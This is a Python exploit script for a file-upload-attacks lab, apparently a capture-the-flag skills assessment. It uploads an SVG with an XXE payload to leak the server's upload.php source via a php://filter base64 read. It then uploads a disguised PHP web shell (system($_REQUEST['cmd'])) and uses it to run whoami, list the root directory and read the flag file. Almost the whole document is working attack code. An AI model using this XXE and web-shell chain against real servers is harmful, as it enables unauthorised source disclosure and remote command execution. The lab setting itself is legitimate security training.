""" 
---------------------------
Skills Assesment: File Upload Attacks
---------------------------

1. Try to exploit the upload form to read the flag found at the root directory "/".

"""

# Import Request to send web request to the internet
import requests
import sys
import subprocess
from datetime import date
import base64, re
# Module to display output in different colors.
from colorama import Fore, Back, Style
"""
Disable the display of certificate warnings when requests 
are made to websites using insecure certificates. This can 
be useful in scenarios where targeted web applications use 
self-signed certificates as is the case in the AWAE labs.
"""
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
# Optional headers to mimic your Burp capture
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "*/*",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://{target}",
    "Referer": "http://{target}/",
    # don't set Content-Type here — requests will set the correct multipart boundary
}
    
def main():
    """
    Main entry point:
    - validate CLI args
    - build request info
    - simulate (or actually perform) the request
    - format and print the response blocks
    """
    # If the script is ran without specify the target
    if len(sys.argv) != 2:
        print(f"In CLI, Usage should be: {sys.argv[0]} target")
        print(f"Example: {sys.argv[0]} 10.0.0.1")
        print(f"Example: {sys.argv[0]} manageengine")
        sys.exit(1)

    # Obtain taregt from CLI
    target = sys.argv[1].strip().rstrip('/')   # from CLI202
    
    # ============================ PHP SCRIPT AND DATE ============================ #
    svg_php_jpeg_filename = "svg.phar.jpeg"
    svg_php_jpeg_content = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg> <?php system($_REQUEST["cmd"]); ?>'
    svg_png_filename = "svg.shell.png"
    source_code_content = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/contact/resource=upload.php"> ]><svg>&xxe;</svg>'
    # Get today's date as a date object
    today = date.today()
    # Format the date as YY-MM-DD
    formatted_date = today.strftime("%y%m%d")
    
    # ============================ UPLOAD AND ACCESS URL of TARGET ============================ #
    # URL to upload file while visiting the contact page
    update_upload_url = f"http://{target}/contact/upload.php"
    # URL to access the uploaded file in user_feedback_submissions folder
    access_user_feedback_submissions_url = f"http://{target}/contact/user_feedback_submissions/{formatted_date}_{svg_php_jpeg_filename}"
    # Check RCE and Access Flag URLs
    check_rce_url = f"{access_user_feedback_submissions_url}?cmd=whoami"
    check_rce_url_2 = f"{access_user_feedback_submissions_url}?cmd=ls%20/"
    access_flag_url = f"{access_user_feedback_submissions_url}?cmd=cat%20/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt"
    
    # 1. ============================ UPLOAD FILE TO TARGET, EXECUTE XXE TO TO GATHER SOURCE CODE ============================ #
    print("\n ############### UPLOAD XXE SVG FILE RESPONSE ###############")
    # Upload File 
    upload_response = upload_file(filename=svg_png_filename, file_content=source_code_content, url=update_upload_url)
    print_response(upload_response)
    
    # 2. ============================ DECODE BASE64 SOURCE CODE RESPONSE of TARGET ============================ #
    print("\n ############### BASE64 SOURCE CODE DECODED ###############")
    print_response_base64(upload_response)
    
    # 3. ============================ UPLOAD FILE TO TARGET, EXECUTE RCE PREP with PHP WEB SHELL ============================ #
    print("\n ############### UPLOAD XXE + RCE FILE RESPONSE ###############")

    # Upload File 
    upload_response = upload_file(filename=svg_php_jpeg_filename, file_content=svg_php_jpeg_content, url=update_upload_url)
    # Display upload Response
    print_response(upload_response)

    # 4. ============================ VERIFY RCE  ============================ #
    print("\n ############### VERIFY REMOTE CODE EXECUTION ###############")
    verify_rce = access_web_shell(check_rce_url)
    # Print RCE Response
    print_response(verify_rce)

    # 4.5. ============================ VERIFY RCE pt.2 and reveal flag location  ============================ #
    print("\n ############### REVEAL FLAG LOCATION & NAME ###############")
    verify_rce = access_web_shell(check_rce_url_2)
    # Print RCE Response
    print_response(verify_rce)
    
    # 5. ============================ ACESS FLAG AND WEBSHELL RESPONSE of TARGET ============================ #
    print("\n ############### REVEAL FLAG ###############")
    web_shell_response = access_web_shell(access_flag_url)
    # Display Flag / Web Shell Response
    print_response(web_shell_response)


def upload_file(filename, file_content, url):
    # FILE INFORMATION
    files = {
        # form field name matches the one in Burp capture
        "uploadFile": (filename, file_content.encode("utf-8"), "image/svg+xml"),
    }
    # Add specific headers from Burp capture
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "X-Requested-With": "XMLHttpRequest",
        "DNT": "1",
        "Sec-GPC": "1",
        "Connection": "keep-alive"
    }
    # ============================ Initiate the Request to UPLOAD PHP FILE  ============================ #
    try:
        # WARNING: verify=False disables TLS certificate verification.
        r = requests.post(url, files=files, headers=headers, verify=False, timeout=10)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(2)   
    # return response to upload 
    return r

def access_web_shell(access_url):
    # ============================ ACCESS Web Shell / PHP UPLOAD FILE RESPONSE ============================ #
    try:
        # WARNING: verify=False disables TLS certificate verification.
        r = requests.get(access_url, headers={"User-Agent": HEADERS["User-Agent"]}, verify=False, timeout=10)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(2)
    # return response to with flag
    return r
    

def print_response(response):
    r = response
    # ============================ FORMAT OUTPUT ============================ #
    print("\n======= Custom Exploit Development =======\n")
    print(format_text("REQUEST METHOD:", r.request.method))
    print(format_text("REQUEST URL:", r.request.url))
    print(format_text("REQUEST HEADERS,r.headers is: :", r.request.headers))
    print(format_text("REQUEST BODY (raw):", r.request.body))   # shows form-encoded body
    print(format_text("RESPONSE STATUS,r.status_code is:", r.status_code))
    print(format_text("RESPONSE COOKIES,r.cookies is:", r.cookies))
    print(format_text("RESPONSE CONTENT-LENGTH:", len(r.text)))
    print(format_text("RESPONSE (first 300 chars):\n", r.text))

def print_response_base64(response):
    resp_text = response.text  # from requests
    m = re.search(r'<svg[^>]*>(.*?)</svg>', resp_text, re.S | re.I)
    if not m:
        raise SystemExit("No <svg>...</svg> block found")

    b64 = m.group(1).strip()            # inner text
    # optional sanity check
    if not re.match(r'^[A-Za-z0-9+/=\\s]+$', b64):
        print("Warning: extracted content contains non-base64 chars; proceeding anyway")

    decoded = base64.b64decode(b64)
    print(decoded.decode('utf-8', errors='replace'))

def format_text(title,item):
  """
    Helper to create a nicely formatted console output block.

    - title: short label for the section (e.g. "r.status_code is:")
    - item: item to display (will be stringified)
    Returns a string that contains the title, a separator, the item, and a short marker.
  """
  cr = '\r\n'
  section_break = cr +  "*" * 20 + cr
  item = str(item)
  text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break + '\t'
  return text

if __name__ == "__main__":
    main()